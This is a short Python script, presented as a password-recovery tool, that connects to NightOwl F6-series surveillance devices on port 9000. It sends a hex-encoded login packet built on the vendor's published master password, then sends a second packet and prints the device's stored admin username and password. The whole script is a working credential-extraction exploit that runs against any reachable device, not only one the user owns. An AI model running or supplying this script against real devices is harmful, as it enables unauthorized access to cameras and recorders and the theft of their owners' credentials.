#! /usr/bin/env python3

import argparse
import binascii
import socket
import sys

parser = argparse.ArgumentParser(
                    prog = 'NightOwl admin passwd recovery',
                    description = 'This script recovers the admin '
                                  'password for NightOwl F6-series devices (and maybe others) '
                                  'using the published master password',
                    epilog = 'Master pass for this model is 2x8axc\n'
                    'from https://support.nightowlsp.com/hc/en-us/articles/'
                    '360009216554-Night-Owl-Legacy-Devices. Check that link for other master '
                    'passwords for older systems')
parser.add_argument('-t','--target', required=True ,help='NightOwl device IP')
parser.add_argument('-p','--port',default=9000,help='Default port 9000 should work')
parser.add_argument('-v','--verbose',
                    action='store_true')

args = parser.parse_args()

if not args:
    print(parser.print_help())

print("\nTarget: %s\nPort:   %s\nVerbose: %s"
        % (args.target, args.port, args.verbose))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(2)

try:
    s.connect((args.target, args.port))
except socket.timeout as e:
    print("\nERROR: %s connecting to %s\nCheck the IP and try again" % (e, args.target ))
    sys.exit(-1)

str_init =   ('000000001f000000500000008406000061646d696e00000000000000000000000000000000000' +
              '00000000000000000000000000032783861786300000000000000000000000' +
              '00000000000000000000000000000000000000000000001000000')
str_getPass = '00000000d300f9010000000090060000'

s.send(binascii.unhexlify(str_init))
resp = s.recv(1024)

if resp:
    print('\nSeems like it took the master pass, let\'s proceed.\n')
else:
    print('\nSomething went wrong, exiting script...\n')
    sys.exit(-1)

if args.verbose:
    print('INITIAL RESPONSE: %s\n' % resp)

s.send(binascii.unhexlify(str_getPass))
resp = s.recv(1024)

if args.verbose:
    print('FINAL RESPONSE: %s\n' % resp)

print('Stored creds:\n')
print('USERNAME: %s' % str(resp[56:61]).split("'")[1])
print('PASSWORD: %s' % str(resp[40:48]).split("'")[1])
print('\n')
